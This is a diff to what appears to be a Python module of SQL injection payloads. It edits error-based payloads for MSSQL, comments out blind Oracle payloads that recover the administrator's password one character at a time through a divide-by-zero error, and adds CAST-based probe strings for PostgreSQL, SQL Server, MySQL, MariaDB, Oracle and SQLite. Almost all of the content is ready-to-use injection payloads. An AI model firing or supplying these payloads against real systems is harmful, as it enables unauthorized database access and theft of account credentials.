@@ -51,19 +51,36 @@ payloads_error_row_filter = {
     "MSSQL":       "'+(SELECT CASE WHEN (1=1) THEN CAST(1/0 AS NVARCHAR) ELSE '' END FROM {row} WHERE username='{object}')+"
 }
 
-blindl = {
-    "lenght":"'||(SELECT CASE WHEN LENGTH({password})>{lenght} THEN to_char(1/0) ELSE '' END FROM {users} WHERE username='{administrator}')||'",
-    "pass_finder":"'||(SELECT CASE WHEN SUBSTR(password,{num},1)='{char}' THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'"
+# blindl = {
+#     "lenght":"'||(SELECT CASE WHEN LENGTH({password})>{lenght} THEN to_char(1/0) ELSE '' END FROM {users} WHERE username='{administrator}')||'",
+#     "pass_finder":"'||(SELECT CASE WHEN SUBSTR(password,{num},1)='{char}' THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'"
+# }
+
+
+# """
+
+# [1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20]
+
+# [a,b,c,d,e,f,g,h,i,j,k,l,m,n,o,p,q,r,s,t,u,v,w,x,y,z,A,B,C,D,E,F,G,H,I,J,K,L,M,N,O,P,Q,R,S,T,U,V,W,X,Y,Z,0,1,2,3,4,5,6,7,8,9]
+
+
+# '||(SELECT CASE WHEN SUBSTR(password,{num},1)='{char}' THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'
+
+# """
+
+# cast_payloads = {
+#     "MySQL": "' AND (SELECT 1)=1-- -",
+#     "PostgreSQL": "' AND CAST((SELECT 1) AS int)--",
+#     "SQL Server": "' AND CAST((SELECT 1 AS int))=1--",
+#     "Oracle": "' AND CAST((SELECT 1 AS NUMBER))=1--",
+#     "SQLite": "' AND CAST((SELECT 1) AS INTEGER)=1--"
+# }
+
+payloads_cast_select1 = {
+    "PostgreSQL": "' AND CAST((SELECT 1) AS int)--",
+    "SQL Server": "' AND CAST((SELECT 1) AS INT)--",
+    "MySQL": "' AND CAST((SELECT 1) AS SIGNED)-- ",
+    "MariaDB": "' AND CAST((SELECT 1) AS SIGNED)-- ",
+    "Oracle": "' AND CAST((SELECT 1 FROM dual) AS NUMBER)--",
+    "SQLite": "' AND CAST((SELECT 1) AS INTEGER)--"
 }
-
-
-"""
-
-[1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20]
-
-[a,b,c,d,e,f,g,h,i,j,k,l,m,n,o,p,q,r,s,t,u,v,w,x,y,z,A,B,C,D,E,F,G,H,I,J,K,L,M,N,O,P,Q,R,S,T,U,V,W,X,Y,Z,0,1,2,3,4,5,6,7,8,9]
-
-
-'||(SELECT CASE WHEN SUBSTR(password,{num},1)='{char}' THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'
-
-"""
